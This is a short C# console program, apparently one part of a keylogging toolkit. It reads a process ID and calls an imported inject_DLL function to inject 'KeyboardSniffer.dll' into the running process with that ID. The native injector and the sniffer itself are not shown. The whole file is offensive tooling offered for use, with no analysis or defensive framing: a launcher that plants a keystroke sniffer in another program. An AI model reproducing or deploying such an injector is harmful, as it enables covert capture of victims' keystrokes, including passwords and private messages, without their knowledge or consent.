using System;
using System.Runtime.InteropServices;

namespace InjectKeyboardSniffer
{
    internal class Program
    {
        [DllImport("Inject.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern void inject_DLL(string file_name, int PID);

        static void Main(string[] args)
        {
            int PID = Convert.ToInt32(Console.ReadLine());
            inject_DLL("KeyboardSniffer.dll", PID);
        }
    }
}
